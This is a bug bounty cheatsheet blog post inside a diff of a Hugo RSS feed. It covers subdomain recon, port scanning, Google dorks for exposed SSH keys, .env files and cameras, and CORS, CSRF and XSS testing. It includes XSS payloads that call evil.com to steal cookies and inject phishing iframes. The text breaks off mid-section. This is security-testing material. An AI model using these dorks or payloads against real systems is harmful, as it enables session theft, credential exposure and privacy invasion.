@@ -1,0 +1,2449 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Cybersecurity on Orangeymango</title><link>https://orangeymango.me/tags/cybersecurity/</link><description>Recent content in Cybersecurity on Orangeymango</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 24 Jul 2024 16:50:00 +0000</lastBuildDate><atom:link href="https://orangeymango.me/tags/cybersecurity/index.xml" rel="self" type="application/rss+xml"/><item><title>Bug Bounty Essentials - A Comprehensive Cheatsheet</title><link>https://orangeymango.me/p/bug-bounty-essentials-a-comprehensive-cheatsheet/</link><pubDate>Wed, 24 Jul 2024 16:50:00 +0000</pubDate><guid>https://orangeymango.me/p/bug-bounty-essentials-a-comprehensive-cheatsheet/</guid><description>&lt;img src="https://miro.medium.com/v2/resize:fit:1400/1*wBuE9-f32uHnqH9Sq4EFiQ.png" alt="Featured image of post Bug Bounty Essentials - A Comprehensive Cheatsheet" />&lt;h1 id="recon-workflow">Recon Workflow
+&lt;/h1>&lt;h2 id="1-initial-reconnaissance">1. Initial Reconnaissance
+&lt;/h2>&lt;h3 id="11-finding-subdomains">1.1 Finding Subdomains
+&lt;/h3>&lt;ol>
+&lt;li>&lt;strong>Linked &amp;amp; JS Discovery with Burp Suite Pro&lt;/strong>
+&lt;ul>
+&lt;li>Turn off passive scanning&lt;/li>
+&lt;li>Set forms to auto-submit&lt;/li>
+&lt;li>Configure scope and keywords&lt;/li>
+&lt;li>Browse the main site&lt;/li>
+&lt;li>Spider all hosts&lt;/li>
+&lt;li>Go to Target → Scope → Advanced Scope Control → Add host or IP range&lt;/li>
+&lt;li>Show only scope items&lt;/li>
+&lt;li>Select all hosts → Engagement Tools → Analyze Target → Save report as HTML file&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Other Tools for Subdomain Discovery&lt;/strong>
+&lt;ul>
+&lt;li>&lt;code>Gospider&lt;/code>&lt;/li>
+&lt;li>&lt;code>hakrawler&lt;/code>&lt;/li>
+&lt;li>&lt;code>Subdomainizer&lt;/code>:
+&lt;ul>
+&lt;li>Find subdomains referenced in JS files&lt;/li>
+&lt;li>Identify cloud services referenced in JS files&lt;/li>
+&lt;li>Use Shannon Entropy formula to find potentially sensitive items in JS files&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;code>subscraper&lt;/code>: If only looking for subdomains&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Scraping with Amass&lt;/strong>
+&lt;ul>
+&lt;li>&lt;code>amass -d example.com&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Scraping with Subfinder v2&lt;/strong>
+&lt;ul>
+&lt;li>&lt;code>subfinder -d example.com -v&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Scraping with &lt;a class="link" href="http://github-subdomains.py/" target="_blank" rel="noopener"
+>Github-subdomains.py&lt;/a>&lt;/strong>
+&lt;ul>
+&lt;li>&lt;code>python3 github-subdomains.py -t &amp;quot;githubpersonalaccounttoken&amp;quot; -d example.com &amp;gt; example.com&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Scraping with Cloud Ranges&lt;/strong>
+&lt;ul>
+&lt;li>Technique to monitor AWS, GCP, Azure for SSL&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h3 id="12-subdomain-brute-forcing">1.2 Subdomain Brute Forcing
+&lt;/h3>&lt;ol>
+&lt;li>&lt;strong>With Amass&lt;/strong>
+&lt;ul>
+&lt;li>Guessing for live subdomains with a large list of common subdomain names&lt;/li>
+&lt;li>&lt;code>amass enum -brute -d example.com -src&lt;/code>&lt;/li>
+&lt;li>&lt;code>amass enum -brute -d example.com -rf resolvers.txt -w bruteforce.list&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>With shuffleDNS&lt;/strong>
+&lt;ul>
+&lt;li>&lt;code>shuffledns -d example.com -w words.txt -r resolvers-excellent.txt&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Subdomain Brute Forcing Lists&lt;/strong>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://github.com/tomnomnom" target="_blank" rel="noopener"
+>Tomnomnom&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/Assetnote/commonspeak2" target="_blank" rel="noopener"
+>Assetnote Commonspeak2&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Alteration Scanning&lt;/strong>
+&lt;ul>
+&lt;li>&lt;code>altdns&lt;/code>:
+&lt;ul>
+&lt;li>&lt;code>dev1.example.com&lt;/code>&lt;/li>
+&lt;li>&lt;code>dev2.example.com&lt;/code>&lt;/li>
+&lt;li>&lt;code>dev-1.example.com&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h2 id="2-infrastructure-discovery">2. Infrastructure Discovery
+&lt;/h2>&lt;ol>
+&lt;li>&lt;strong>Finding Infrastructure Sources&lt;/strong>
+&lt;ul>
+&lt;li>Censys&lt;/li>
+&lt;li>Robtex&lt;/li>
+&lt;li>Wayback Machine&lt;/li>
+&lt;li>DNSdumpster&lt;/li>
+&lt;li>&lt;a class="link" href="http://ptrarchive.com/" target="_blank" rel="noopener"
+>PTRarchive.com&lt;/a>&lt;/li>
+&lt;li>Netcraft&lt;/li>
+&lt;li>DNSDB Search&lt;/li>
+&lt;li>PassiveTotal&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Certificate Sources&lt;/strong>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://crt.sh/" target="_blank" rel="noopener"
+>crt.sh&lt;/a>&lt;/li>
+&lt;li>Certspotter&lt;/li>
+&lt;li>CertDB&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Security Sources&lt;/strong>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://hackertarget.com/" target="_blank" rel="noopener"
+>Hackertarget&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://securitytrails.com/" target="_blank" rel="noopener"
+>Security Trails&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://www.virustotal.com/" target="_blank" rel="noopener"
+>VirusTotal&lt;/a>&lt;/li>
+&lt;li>F-Secure&lt;/li>
+&lt;li>Riddler&lt;/li>
+&lt;li>&lt;a class="link" href="https://www.threatcrowd.org/" target="_blank" rel="noopener"
+>ThreatCrowd&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://www.threatminer.org/" target="_blank" rel="noopener"
+>ThreatMiner&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h2 id="3-port-analysis--service-analysis">3. Port Analysis &amp;amp; Service Analysis
+&lt;/h2>&lt;ol>
+&lt;li>&lt;strong>Port Analysis with Massscan&lt;/strong>
+&lt;ul>
+&lt;li>&lt;code>massscan -p1-65535 &amp;lt;ip&amp;gt; --max-rate 1800 -oG outputfile.txt&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Port Analysis with Dnmasscan&lt;/strong>
+&lt;ul>
+&lt;li>&lt;code>dnmasscan outputfile.txt dns.log -p80,443 -oG masscan.log&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Service Scanning with Brutespray&lt;/strong>
+&lt;ul>
+&lt;li>Scan remote administration protocols for default passwords, which takes Nmap OG file format&lt;/li>
+&lt;li>&lt;code>Massscan&lt;/code> → &lt;code>nmapservice scan -oG&lt;/code> → &lt;code>brutespray credential brute force&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h2 id="4-vulnerability-discovery">4. Vulnerability Discovery
+&lt;/h2>&lt;ol>
+&lt;li>&lt;strong>Subdomain Takeover&lt;/strong>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://github.com/haccer/subjack" target="_blank" rel="noopener"
+>Can I Take Over XYZ GitHub Repo&lt;/a>&lt;/li>
+&lt;li>&lt;code>SubOver&lt;/code>&lt;/li>
+&lt;li>&lt;code>nuclei&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Screenshotting&lt;/strong>
+&lt;ul>
+&lt;li>&lt;code>eyewitness&lt;/code>&lt;/li>
+&lt;li>&lt;code>aquatone&lt;/code>&lt;/li>
+&lt;li>&lt;code>httpscreenshot&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h2 id="5-google-dorking">5. Google Dorking
+&lt;/h2>&lt;ol>
+&lt;li>&lt;strong>Scraping with Google&lt;/strong>
+&lt;ul>
+&lt;li>&lt;code>site:example.com -www.example.com&lt;/code>&lt;/li>
+&lt;li>&lt;code>site:example.com -www.example.com -sub.example.com&lt;/code>&lt;/li>
+&lt;li>&lt;code>site:example.com -www.example.com -sub.example.com -dev.example.com&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h2 id="6-automation-tools--frameworks">6. Automation Tools &amp;amp; Frameworks
+&lt;/h2>&lt;ol>
+&lt;li>&lt;strong>Extending Tools&lt;/strong>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://github.com/codingo/Interlace" target="_blank" rel="noopener"
+>Interlace&lt;/a>&lt;/li>
+&lt;li>Recon Framework&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/tomnomnom/tools" target="_blank" rel="noopener"
+>Tomnomnom Tools&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>C-tier Frameworks&lt;/strong>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://github.com/AdmiralGaust/bountyRecon" target="_blank" rel="noopener"
+>AdmiralGaust/bountyRecon&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/offhoursscoding/recon" target="_blank" rel="noopener"
+>offhoursscoding/recon&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/Sambal0x/recon-tools" target="_blank" rel="noopener"
+>Sambal0x/recon-tools&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/JoshuaMart/Autorecon" target="_blank" rel="noopener"
+>JoshuaMart/Autorecon&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/yourbuddy25/Hunter" target="_blank" rel="noopener"
+>yourbuddy25/Hunter&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://gist.github.com/dwisiswant05f647e3d406b5e984e6d69d3538968cd" target="_blank" rel="noopener"
+>ultimate_recon.sh&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>B-tier Frameworks&lt;/strong>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://github.com/capt-meelo/LazyRecon" target="_blank" rel="noopener"
+>capt-meelo/LazyRecon&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/phspade/Automated-Scanner" target="_blank" rel="noopener"
+>phspade/Automated-Scanner&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener"
+>shmilylty/OneForAll&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/SolomonSklash/chomp-scan" target="_blank" rel="noopener"
+>SolomonSklash/chomp-scan&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/TypeError/domained" target="_blank" rel="noopener"
+>TypeError/domained&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/Screetsec/Sudomy" target="_blank" rel="noopener"
+>Screetsec/Sudomy&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/devanshbatham/Gorecon" target="_blank" rel="noopener"
+>devanshbatham/Gorecon&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/LordNeoStark/tugarecon" target="_blank" rel="noopener"
+>LordNeoStark/tugarecon&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>A-tier Frameworks&lt;/strong>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://github.com/Edu4rdSHL/findomain" target="_blank" rel="noopener"
+>Edu4rdSHL/findomain&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/SilverPoision/Rock-ON" target="_blank" rel="noopener"
+>SilverPoision/Rock-ON&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/epi052/recon-pipeline" target="_blank" rel="noopener"
+>epi052/recon-pipeline&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>S-tier Frameworks&lt;/strong>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://intrigue.io/" target="_blank" rel="noopener"
+>Intrigue.io&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://www.assetnote.io/" target="_blank" rel="noopener"
+>AssetNote&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://www.spiderfoot.net/" target="_blank" rel="noopener"
+>Spiderfoot&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://chaos.projectdiscovery.io/" target="_blank" rel="noopener"
+>Project Discovery Framework&lt;/a> - Download subdomain files of all public programs in HackerOne &amp;amp; Bugcrowd, watch for new domains&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h2 id="7-mindmaps">7. Mindmaps
+&lt;/h2>&lt;ol>
+&lt;li>&lt;strong>XMind&lt;/strong>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://www.xmind.net/" target="_blank" rel="noopener"
+>XMind - Mind Mapping Software&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h1 id="google-dork-techniques">Google Dork Techniques
+&lt;/h1>&lt;h2 id="1-basic-search-operators">1. Basic Search Operators
+&lt;/h2>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>cache:&lt;/strong>&lt;/p>
+&lt;p>Shows the cached version of any website.&lt;/p>
+&lt;p>Example: &lt;code>cache:example.com&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>allintext:&lt;/strong>&lt;/p>
+&lt;p>Searches for specific text contained on any web page.&lt;/p>
+&lt;p>Example: &lt;code>allintext: hacking tools&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>allintitle:&lt;/strong>&lt;/p>
+&lt;p>Searches for pages with titles containing specific text.&lt;/p>
+&lt;p>Example: &lt;code>allintitle:&amp;quot;Security Companies&amp;quot;&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>allinurl:&lt;/strong>&lt;/p>
+&lt;p>Fetches results whose URL contains all the specified characters.&lt;/p>
+&lt;p>Example: &lt;code>allinurl: client area&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>filetype:&lt;/strong>&lt;/p>
+&lt;p>Searches for specific file extensions.&lt;/p>
+&lt;p>Example: &lt;code>filetype: jpg filename:id_rsa&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>inurl:&lt;/strong>&lt;/p>
+&lt;p>Searches for URLs containing a specific keyword.&lt;/p>
+&lt;p>Example: &lt;code>inurl: admin&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>intitle:&lt;/strong>&lt;/p>
+&lt;p>Searches for keywords in the title of pages.&lt;/p>
+&lt;p>Example: &lt;code>intitle:secu&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>inanchor:&lt;/strong>&lt;/p>
+&lt;p>Searches for pages with exact anchor text used in links.&lt;/p>
+&lt;p>Example: &lt;code>inanchor:&amp;quot;cyber security&amp;quot;&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>intext:&lt;/strong>&lt;/p>
+&lt;p>Locates pages containing certain strings inside their text.&lt;/p>
+&lt;p>Example: &lt;code>intext:&amp;quot;safe internet&amp;quot;&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>link:&lt;/strong>&lt;/p>
+&lt;p>Shows pages linking to a specified URL.&lt;/p>
+&lt;p>Example: &lt;code>link: microsoft.com&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>site:&lt;/strong>&lt;/p>
+&lt;p>Shows a list of all indexed URLs for a specified domain or subdomain.&lt;/p>
+&lt;p>Example: &lt;code>site:securitytrails.com&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>wildcard (*)&lt;/strong>&lt;/p>
+&lt;p>Used to search for pages that contain “anything” before your word.&lt;/p>
+&lt;p>Example: &lt;code>* a website&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>logical OR (|)&lt;/strong>&lt;/p>
+&lt;p>Finds sites containing either one term or another.&lt;/p>
+&lt;p>Example: &lt;code>&amp;quot;security&amp;quot; &amp;quot;tips&amp;quot;&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>plus (+)&lt;/strong>&lt;/p>
+&lt;p>Concatenates words to detect pages using more than one specific key.&lt;/p>
+&lt;p>Example: &lt;code>security + trails&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>minus (-)&lt;/strong>&lt;/p>
+&lt;p>Excludes pages containing certain words.&lt;/p>
+&lt;p>Example: &lt;code>security -trails&lt;/code>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="2-advanced-search-techniques">2. Advanced Search Techniques
+&lt;/h2>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>Log Files&lt;/strong>&lt;/p>
+&lt;p>Searches for results including usernames inside log files.&lt;/p>
+&lt;p>Example: &lt;code>allintext:username filetype:log&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Vulnerable Web Servers&lt;/strong>&lt;/p>
+&lt;p>Detects vulnerable or hacked servers.&lt;/p>
+&lt;p>Example: &lt;code>inurl:/proc/self/cwd&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Open FTP Servers&lt;/strong>&lt;/p>
+&lt;p>Finds public FTP servers which may reveal interesting information.&lt;/p>
+&lt;p>Example: &lt;code>intitle:&amp;quot;index of&amp;quot; inurl:ftp&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>ENV Files&lt;/strong>&lt;/p>
+&lt;p>Searches for .env files used by web development frameworks.&lt;/p>
+&lt;p>Example: &lt;code>site:example.com/.env&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>SSH Private Keys&lt;/strong>&lt;/p>
+&lt;p>Finds exposed SSH private keys.&lt;/p>
+&lt;p>Example: &lt;code>intitle:index.of id_rsa -id_rsa.pub&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Putty Logs&lt;/strong>&lt;/p>
+&lt;p>Fetches SSH usernames from Putty logs.&lt;/p>
+&lt;p>Example: &lt;code>filetype:log username putty&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Email Lists&lt;/strong>&lt;/p>
+&lt;p>Searches for Excel files containing email addresses.&lt;/p>
+&lt;p>Example: &lt;code>filetype:xls inurl:&amp;quot;email.xls&amp;quot;&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>University Email Lists&lt;/strong>&lt;/p>
+&lt;p>Filters for .edu domain names to find educational email lists.&lt;/p>
+&lt;p>Example: &lt;code>site:.edu filetype:xls inurl:&amp;quot;email.xls&amp;quot;&lt;/code>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="3-media-and-camera-searches">3. Media and Camera Searches
+&lt;/h2>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>Live Cameras&lt;/strong>&lt;/p>
+&lt;p>Fetches live camera web pages not restricted by IP.&lt;/p>
+&lt;p>Example: &lt;code>inurl:top.htm inurl:currenttime&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>WebcamXP-Based Transmissions&lt;/strong>&lt;/p>
+&lt;p>Finds webcamXP-based live streams.&lt;/p>
+&lt;p>Example: &lt;code>intitle:&amp;quot;webcamXP 5&amp;quot;&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>General Live Cameras&lt;/strong>&lt;/p>
+&lt;p>Finds general live camera feeds.&lt;/p>
+&lt;p>Example: &lt;code>inurl:&amp;quot;lvappl.htm&amp;quot;&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>MP3 Files&lt;/strong>&lt;/p>
+&lt;p>Searches for MP3 files available on the web.&lt;/p>
+&lt;p>Example: &lt;code>intitle: index of mp3&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>PDF Files&lt;/strong>&lt;/p>
+&lt;p>Finds legal free PDF documents.&lt;/p>
+&lt;p>Example: &lt;code>intitle: index of pdf intext: .mp4&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Weather Devices&lt;/strong>&lt;/p>
+&lt;p>Fetches transmissions from Weather Wing devices.&lt;/p>
+&lt;p>Example: &lt;code>intitle:&amp;quot;Weather Wing WS-2&amp;quot;&lt;/code>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h1 id="vulnerability-testing-and-approaches">Vulnerability Testing and Approaches
+&lt;/h1>&lt;h3 id="1-privilege-escalation">1. Privilege Escalation
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong> Horizontal (admin-admin &amp;amp; user to user) / Vertical Privilege Escalation (User to admin)&lt;/p>
+&lt;hr>
+&lt;h3 id="2-privacy-settings-bugs">2. Privacy Settings Bugs
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong> (Details missing)&lt;/p>
+&lt;hr>
+&lt;h3 id="3-session-bugs">3. Session Bugs
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Check if session tokens/access tokens:
+&lt;ul>
+&lt;li>Expires on logout&lt;/li>
+&lt;li>Password reset/change&lt;/li>
+&lt;li>Expires on user removal&lt;/li>
+&lt;li>Expires on changing roles&lt;/li>
+&lt;li>Insufficient session fixation (cookie editor extension used)****&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="4-insecure-cors-misconfiguration">4. Insecure CORS Misconfiguration
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Curl command to detect: &lt;code>curl &amp;lt;http://site.com&amp;gt; -H &amp;quot;Origin:&amp;lt;http://evil.com&amp;gt;&amp;quot; -I&lt;/code>&lt;/li>
+&lt;li>Check &lt;code>Access-Control-Allow-Origin&lt;/code> header:
+&lt;ul>
+&lt;li>`` (not exploitable)&lt;/li>
+&lt;li>&lt;code>origin: evil.com&lt;/code>&lt;/li>
+&lt;li>&lt;code>origin: site.evil.com&lt;/code>&lt;/li>
+&lt;li>&lt;code>origin: null&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>If any site disclosing usernames &amp;amp; password, try CORS exploit.&lt;strong>Tool Used:&lt;/strong> Corsy / Burp Suite&lt;/li>
+&lt;/ul>
+&lt;h3 id="5-csrf">5. CSRF
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Intercept the victim request &amp;amp; generate CSRF PoC; send to server as an attacker&lt;/li>
+&lt;li>CSRF can be GET or POST based&lt;/li>
+&lt;li>Try in all state-changing requests&lt;/li>
+&lt;li>Use &lt;a class="link" href="http://jsfiddle.net/" target="_blank" rel="noopener"
+>jsfiddle.net&lt;/a> online tool&lt;/li>
+&lt;li>Check if it validates origin/referer. If not, CSRF is possible.&lt;/li>
+&lt;li>Check if it is cookie-based authentication.&lt;/li>
+&lt;li>If anti-CSRF tokens are present:
+&lt;ol>
+&lt;li>Remove anti-CSRF tokens &amp;amp; parameter&lt;/li>
+&lt;li>Pass blank parameter&lt;/li>
+&lt;li>Add similar length token&lt;/li>
+&lt;li>Add another user’s valid anti-CSRF token&lt;/li>
+&lt;li>Random token in long length (e.g., &lt;code>aaaaaaaaa&lt;/code>)&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;li>If content-type verification:
+&lt;ol>
+&lt;li>If no anti-CSRF tokens are present&lt;/li>
+&lt;li>Try content-type: &lt;code>text/plain&lt;/code>&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;li>Flash CSRF&lt;/li>
+&lt;li>Check if any cross-domain policy using SWF JSON tool.&lt;strong>Tool Used:&lt;/strong> &lt;a class="link" href="http://jsfiddle.net/" target="_blank" rel="noopener"
+>jsfiddle.net&lt;/a> / Burp Suite&lt;/li>
+&lt;/ul>
+&lt;h3 id="6-xss">6. XSS
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Input value (try payload like &lt;code>&amp;quot;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&amp;quot;&lt;/code>) reflected without XSS protection&lt;/li>
+&lt;li>Use XSS validator - Intruder&lt;/li>
+&lt;li>Host header injection through XSS:
+&lt;ul>
+&lt;li>Add &lt;code>referer: batman&lt;/code>&lt;/li>
+&lt;li>Add &lt;code>hostheader: bing.com&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>URL redirection through XSS:
+&lt;ul>
+&lt;li>&lt;code>document.location.href=&amp;quot;&amp;lt;http://evil.com&amp;gt;&amp;quot;&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Phishing through XSS - iframe injection:
+&lt;ul>
+&lt;li>&lt;code>&amp;lt;iframe src=&amp;quot;&amp;lt;http://evil.com&amp;gt;&amp;quot; height=&amp;quot;100&amp;quot; width=&amp;quot;100&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Cookie stealing through XSS:
+&lt;ul>
+&lt;li>&lt;code>document.location.href=&amp;quot;&amp;lt;http://evil.com/p/?page=&amp;gt;&amp;quot; + document.cookie&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>File upload through XSS:
+&lt;ul>
+&lt;li>Upload a picture file, intercept it, and change &lt;code>picture.jpg&lt;/code> to XSS payload using Intruder attack&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Remote File Inclusion (RFI) through XSS:
+&lt;ul>
+&lt;li>&lt;code>php?=http://brutelogic.com.br/poc.svg - xsspayload&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Convert self XSS to reflected one:
+&lt;ul>
+&lt;li>Copy response in a &lt;code>file.html&lt;/code> -&amp;gt; it will work&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>XSS through URI parameters:
+&lt;ul>
+&lt;li>&lt;code>site.com/about/xss&amp;quot;&amp;gt;&amp;lt;script&amp;gt;&lt;/code>&lt;strong>Tool Used:&lt;/strong> XSS Validator / Burp Suite&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h3 id="7-host-header-injection">7. Host Header Injection
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>URL redirection through host header:
+&lt;ul>
+&lt;li>Check URL having 2xx, 3xx&lt;/li>
+&lt;li>Change &lt;code>X-forwarded-host&lt;/code> to &lt;code>realweb.com&lt;/code> and &lt;code>bing.com&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Web cache poisoning through Host Header Injection:
+&lt;ul>
+&lt;li>Injection will be reflected in any buttons of the page&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Host header attack on password reset page&lt;/li>
+&lt;li>XSS through Host Header Injection****&lt;/li>
+&lt;/ol>
+&lt;h3 id="8-url-redirection-or-open-redirect">8. URL Redirection or Open Redirect
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Common parameter list:
+&lt;ul>
